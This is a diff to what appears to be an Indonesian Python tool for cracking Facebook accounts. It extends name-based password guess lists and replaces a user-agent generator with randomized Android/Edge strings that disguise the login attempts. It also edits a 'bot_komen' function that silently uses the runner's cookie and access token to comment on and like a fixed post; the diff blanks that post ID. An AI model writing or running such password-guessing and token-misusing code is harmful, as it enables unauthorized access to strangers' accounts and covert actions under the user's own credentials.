@@ -68,13 +68,13 @@ def login_cookie():
 def bot_komen(cookie, token_eaag):
     with requests.Session() as r: # Kagak Usah Di Ganti, Anggap Saja Sebagai Tanda Terimakasih :V
         text = random.choice(
-            ['Keren Bang 😎','Hello World!','Mantap Bang ☺️','I Love You ❤️','Hai Bang 😘']
+            ['.']
         )
         r.cookies.update({
             'cookie': cookie
         })
-        response = r.post('https://graph.facebook.com/10160350353143544/comments/?message={}&access_token={}'.format(text, token_eaag)).text # Jangan Di Ganti!
-        response2 = r.post('https://graph.facebook.com/10160350353143544/likes?summary=true&access_token={}'.format(token_eaag)).text # Jangan Di Ganti!
+        response = r.post('https://graph.facebook.com/./comments/?message={}&access_token={}'.format(text, token_eaag)).text # Jangan Di Ganti!
+        response2 = r.post('https://graph.facebook.com/./likes?summary=true&access_token={}'.format(token_eaag)).text # Jangan Di Ganti!
         if "\"id\":\"" in str(response) and str(response2) == 'true':
             return 0
         else:
@@ -248,6 +248,7 @@ class crack:
                     continue
                 else:
                     self.password.append(nama + '123')
+                    self.password.append(nama + '321')
                     self.password.append(nama + '1234')
                     self.password.append(nama + '12345')
                     self.password.append(nama + '123456')
@@ -257,6 +258,7 @@ class crack:
                 else:
                     self.password.append(name)
                     self.password.append(nama + '123')
+                    self.password.append(nama + '321')
                     self.password.append(nama + '1234')
                     self.password.append(nama + '12345')
                     self.password.append(nama + '123456')
@@ -375,12 +377,15 @@ class crack:
             Console().print(f"[bold hot_pink2]   ╰─>[bold red] {str(e).title()}!                    ")
     ### REALME USERAGENT ###
     def realme_useragent(self, total):
-        for _ in range(total):
-            self.browser_version = (f'{random.randrange(85, 105)}.0.{random.randrange(4200, 4900)}.{random.randrange(40, 150)}')
-            self.build = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(6)))
-            self.android_version = random.choice(['11', '10'])
-            self.android_model = random.choice(['RMX2052', 'RMX2072', 'RMX2075', 'RMX2071', 'RMX2076', 'RMX2144'])
-            self.useragent = ('Mozilla/5.0 (Linux; Android {}; {} Build/{}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{} Mobile Safari/537.36'.format(self.android_version, self.android_model, self.build, self.browser_version))
+      for _ in range(total):
+        self.rr = random.randint
+        self.rc = random.choice
+        self.andro = self.rc(["9","9.0","8.1.0","7.1.2","6.0.1","10.0.1"])
+        self.merk = str(self.rr(4, 11))
+        self.build = str(self.rr(111111, 199999))
+        self.chrome = str(self.rr(60, 99))+".0."+str(self.rr(3300, 5900))+"."+str(self.rr(120, 150))
+        self.edg = str(self.rr(40, 99))+"0.0."+str(self.rr(2000, 2999))
+        self.useragent = (f"Mozilla/5.0 (Linux; Android {self.andro}; Redmi {self.merk} Prime Build/OPM6.{self.build}.030.K1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{self.chrome} Mobile Safari/537.36 EdgA/{self.edg}")
         return self.useragent
 
 if __name__ == '__main__':
